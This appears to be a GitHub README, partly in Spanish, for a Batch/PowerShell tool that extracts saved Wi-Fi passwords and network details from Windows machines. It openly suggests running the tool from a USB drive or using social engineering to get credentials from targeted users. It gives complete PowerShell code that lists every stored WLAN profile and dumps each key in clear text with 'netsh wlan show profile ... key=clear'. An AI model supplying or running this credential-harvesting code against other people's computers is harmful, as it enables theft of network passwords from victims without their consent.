# Wi-Fi

![](https://1.bp.blogspot.com/-NZFmbAF5_6U/WfMx3j17FEI/AAAAAAAAId4/uDLKER2aeV8mPgUVfuawP3_5adAj5kg5gCLcBGAs/s1600/Screenshot_4.png)

The program is developed using Batch and PowerShell, designed to extract passwords and network information stored on a computer, either manually or automatically. It specifically targets passwords saved on the system. The program can be stored on a USB drive and executed directly from it, or social engineering techniques can be employed to retrieve the credentials from targeted users...

- https://lpericena.blogspot.com/2017/10/wiffi.html
- Pasos a seguir
```
1. Download the program  
2. Run the program  
3. Select Option 1: Retrieve wireless network information  
4. Select Option 2: Extract Wi-Fi passwords manually  
5. Select Option 3: Extract Wi-Fi passwords automatically  
6. Follow the prompts until the process is complete  
```
### Código Powershell
- Autor : https://github.com/H3LL0WORLD
```
Function Get-WLAN_Profiles {
	param (
		[ValidateSet('es-ES','en-EN')]
		$LANGUAGE = $Host.CurrentUICulture.Name
	)
	$LANGUAGES = @{
		'es-ES' = New-Object psobject -Property @{
			'user_profiles_text' 	 = 'Perfil de todos los usuarios'
			'profile_not_found_text' = 'No se encuentra el perfil'
			'ssid_name_text' 		 = 'Nombre de SSID'
			'network_type_text' 	 = 'Tipo de red'
			'authentication_text'	 = 'Autenticación'
			'encryption_text'	 	 = 'Cifrado'
			'key_text' 				 = 'Contenido de la clave'
		}
		'en-EN' = New-Object psobject -Property @{
			'user_profiles_text' 	 = 'All User Profile'
			'profile_not_found_text' = 'Profile not found'
			'ssid_name_text' 		 = 'SSID name'
			'network_type_text' 	 = 'Network Type'
			'authentication_text'	 = 'Authentication'
			'encryption_text'	 	 = 'Cipher'
			'key_text' 				 = 'Key Content'
		}
	}
	$LANG = $LANGUAGES."$LANGUAGE"

	function getValueByName ( $inputText, $nameString ) {
		$value = "";
		if ([regex]::IsMatch($inputText,"\b$nameString\b","IgnoreCase")) {
			$value = ([regex]::Replace($inputText,"^[^:]*: ","")); 
		}
		return $value.Trim();
	}

	$Profiles = @()
	netsh wlan show profiles | % {
		$profile = getValueByName $_ $LANG.'user_profiles_text';
		if ($profile) {
			$Profiles += $profile
		}
	}

	$WLAN_Profiles = @()
	$rowNumber = -1;
	$Profiles | % {
		$wlan_Profile = netsh wlan show profile $_ key=clear
		if ($wlan_Profile.Contains($LANG.'profile_not_found_text')){
			return
		}
		$InterfaceName = $null
		$wlan_Profile | % {
			if (!($InterfaceName)) {
				$InterfaceName = getValueByName $_ $LANG.'ssid_name_text'
				$InterfaceName = $InterfaceName.Trim('"')
							
				if ($InterfaceName) {
					$row = New-Object PSObject -Property @{
						InterfaceName = $InterfaceName
						SSID = $InterfaceName
						NetworkType=""
						Authentication=""
						Encryption=""
						Key=""
					}
					$rowNumber+=1
					$WLAN_Profiles += $row
					#$WLAN_Profiles | ft
					return
				}
			}
			if (!($WLAN_Profiles[$rowNumber].NetworkType)) {
				$NetworkType = getValueByName $_ $LANG.'network_type_text';
				if ($NetworkType) {
					  $WLAN_Profiles[$rowNumber].NetworkType = $NetworkType
				}
			}
			
			if (!($WLAN_Profiles[$rowNumber].Authentication)) {
				$Authentication = getValueByName $_ $LANG.'authentication_text';
				if ($Authentication) {
					  $WLAN_Profiles[$rowNumber].Authentication = $Authentication
				}
			}
			
			if (!($WLAN_Profiles[$rowNumber].Encryption)) {
				$Encryption = getValueByName $_ $LANG.'encryption_text';
				if ($Encryption) {
					  $WLAN_Profiles[$rowNumber].Encryption = $Encryption
				}
			}
			
			if (!($WLAN_Profiles[$rowNumber].Key)) {
				$Key = getValueByName $_ $LANG.'key_text';
				if ($Key) {
					  $WLAN_Profiles[$rowNumber].Key = $Key
				}
			}
		}
	}

	if ($WLAN_Profiles.Count -gt 0) {
		'Total WLAN_Profiles: ' + $WLAN_Profiles.Count
		<#return#> $WLAN_Profiles | Select-Object 		   SSID,
											 Authentication,
														Key,
												 Encryption,
												NetworkType
	} else {
		'No WLAN Profiles found!'
	}
}

```

## Expressions of gratitude
* Well, I hope it is useful to you. If you have any questions, you can contact me at my social networks:
- 🌎Blogger          https://lpericena.blogspot.com/
- 💡 Github            https://github.com/Pericena
- 🐤 twitter             https://twitter.com/LPericena

* Thank you
---
Por [Pericena](https://github.com/Pericena) Donación paypal
https://www.paypal.com/paypalme/lpericena
